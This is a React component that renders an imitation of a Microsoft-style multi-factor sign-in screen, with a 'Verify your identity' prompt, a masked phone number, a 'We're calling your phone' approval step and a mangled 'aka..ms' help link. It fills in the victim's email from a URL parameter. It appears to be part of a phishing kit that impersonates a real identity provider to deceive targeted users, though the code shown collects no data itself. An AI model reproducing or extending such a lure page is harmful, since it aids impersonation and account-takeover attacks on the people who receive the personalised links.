import React, { useState } from "react";
import Logo from "./logo.svg";
import { useParams } from "react-router-dom";

import { BsTelephoneInbound } from "react-icons/bs";

export default function Hom() {
  const { mail } = useParams();
  const [show, setShow] = useState(true);
  return (
    <div className="container">
      <div className="back"></div>
      <div className={show ? "cont" : "body"}>
        <div className="formss">
          <div style={{ marginBottom: "0.9rem", paddingLeft: "3rem" }}>
            <img src={Logo} alt="logo" />
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              paddingLeft: "3rem",
            }}
          >
            <p style={{ margin: "0px", fontSize: "18px" }}>{mail}</p>
          </div>
          {show ? (
            <div>
              <h2 style={{ paddingLeft: "3rem", fontSize: "2rem" }}>
                Verify your identity
              </h2>
              <div className="call" onClick={() => setShow(!show)}>
                <BsTelephoneInbound size={35} fontWeight="lighter" />
                <p style={{ paddingLeft: "1rem" }}>Call +X XXXXXXXX57</p>
              </div>
              <div className="ca">
                <p className="st">More information</p>
                <p>Are your verification methods current? Check at https://aka..ms/mfasetup</p>
              </div>
              <button className="can">Cancel</button>
            </div>
          ) : (
            <div>
              <h2 style={{ paddingLeft: "3rem", fontSize: "1.6rem" }}>
                Approve sign in request
              </h2>
              <div className="cal">
                <BsTelephoneInbound size={20} />
                <p style={{ paddingLeft: "1rem", margin: "0px" }}>
                  We're calling your phone. Please answer it to continue
                </p>
              </div>
              <div className="ca">
                <p>
                  Having trouble?{" "}
                  <span className="st">Sign in another way</span>
                </p>
                <p className="st">More information</p>
              </div>
            </div>
          )}
        </div>
      </div>
      <footer>
        <p className="footer">
          <span style={{ marginRight: "1rem" }}>Terms of use </span>{" "}
          <span style={{ marginRight: "1rem" }}>privacy & use</span>{" "}
          <b style={{ textAlign: "center" }}>. . .</b>
        </p>
      </footer>
    </div>
  );
}
